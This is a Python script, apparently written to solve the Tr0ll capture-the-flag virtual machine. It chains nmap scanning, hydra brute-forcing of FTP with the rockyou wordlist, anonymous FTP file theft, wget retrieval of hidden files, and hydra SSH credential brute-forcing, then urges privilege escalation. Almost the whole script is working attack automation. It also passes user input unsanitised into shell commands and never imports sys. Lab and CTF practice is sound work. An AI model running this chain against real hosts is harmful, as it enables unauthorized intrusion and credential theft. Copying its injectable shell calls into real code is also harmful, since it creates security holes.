#! /bin/bash
from termcolor import colored as col
from ftplib import FTP
import os
import subprocess
import time
import paramiko
i=1
while i<=1: 
	banner=os.popen("figlet Trollme")
	print(banner.read())
	host_ip=input(col("enter the host ip : " , "red"))
	def scanner():
		global vm_ip
		print(col('discovering_ip' , 'magenta'))
		try:
			nmap_scan=os.popen("nmap -sV "+host_ip+" | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'")
			scanner_result=nmap_scan.read().split()
			print(col('\n'+'Ip_Discoverd' , 'green'))
			for i in range (len(scanner_result)):
				print('\n'+str(i+1) + ' '+col( scanner_result[i] , "blue"))
		except:
			print("Ip not found exiting...")
			sys.exit()
		try:
			vm_ip=input(col("enter the tr0ll's ip : " , "red"))
			vm_portscan=os.popen("nmap -p 21,22,80 "+vm_ip+" | grep 'open'" )
			print(col('\n'+"Scanning port..." , "blue"))
			print(col(vm_portscan.read() , 'green'))
		except:
			print("Looks like your vm is down ...")
			sys.exit()
		try:
			vm_scan=os.popen("nmap -T4 -A -v "+vm_ip+" | grep 'ftp-anon:'")
			print(col('\n'+"Searching for ftp user.." , 'blue'))
			print(col("user found : "+vm_scan.read() , 'green'))
		except:
			print("Kindly check fot ftp is open or not ...")
			sys.exit()
	scanner()

	def ftp_login():
		ftp_user=input(col("Enter the user name for ftp | " , 'red'))
		print(col('\n'+"Bruteforcing the password for ftp ..." , 'blue'))
		try:
			hydra_scan=os.popen("hydra -l "+ftp_user+" -P /usr/share/wordlists/rockyou.txt ftp://"+vm_ip+" | grep -oP 'password: \K.*'")
			password=hydra_scan.read().split()
			print(col("Got  "+str(len(password))+"  passwords ..." , 'green'))
			for i in password:
				print(col(i,'yellow'))
		except:
			print("No password found...")
			sys.exit()
		try:
			print(col("Logging on ftp server and copying file..." , 'blue'))
			ftp = FTP(vm_ip)
			ftp.login()
			ftp.retrlines('LIST')
			with open('lol.pcap', 'wb') as fp:
				ftp.retrbinary('RETR lol.pcap', fp.write)
			print(col("File copied .." , 'green'))
			print(col("BOOYAAH... you got the file"+"\n"+"Stop being lazy just go and bring directory name for me" , 'red' , 'on_grey'))
		except:
			print("Can't connect to the server...")
			sys.exit()
	ftp_login()


	def help():
		try:
			helpme=input(col("If you need any help then type helpme or If you got the directory name type gotit : " , 'yellow'))
			if helpme=="helpme":
				print(col("You are nothing without me... Here is your hint>>> you must use wireshark and go through tcp stream eq 2 for the data..." , "yellow"))
			if helpme=='gotit':
				print("lets go ahead...")
		except:
			print(col("Are you mad? What are you doing ???" , "red"))
			help()

	help()

	def file_download():
		try:
			directory=input(col("Enter the directory name you got : " , "blue"))
			download_data=os.popen("wget -nd -r -l 1 http://"+vm_ip+"/"+directory+"/roflmao")
			data=download_data.read()
			print(col("Got a new file named as>>> roflamo" , "yellow"))
			file=os.popen("strings "+"roflmao "+"| egrep 'Find'")
			print(col(file.read() , 'blue' ,'on_grey'))
			print(col("connecting to the address..." , 'red'))
			user_pass=os.popen("wget -nd -r -l 1 http://"+vm_ip+"/0x0856BF/good_luck/which_one_lol.txt")
			data1=user_pass.read()
			print(col("Got user list and password" , "green"))
		except:
			print(col("Looks like you entered the wrong directory name... Comeon what are you doing???"))
			file_download()
	file_download()

	def ssh_login():
		try:
			userforssh=os.popen("hydra -L which_one_lol.txt -p Pass.txt -u ssh://"+vm_ip+" | grep -oP 'login: \K.*'")
			print(col('\n'+"user: "+userforssh.read() +" found for SSH login", 'green'))
			print(col('\n'+"MY job is done... now run the privillage esclater for root acces to machine."))
			print(col('\n'+"Use above ssh credential to login the machine over ssh...",'yellow'))
		except:
			print(col("User name not found" , "red"))

	ssh_login()
	i+=1
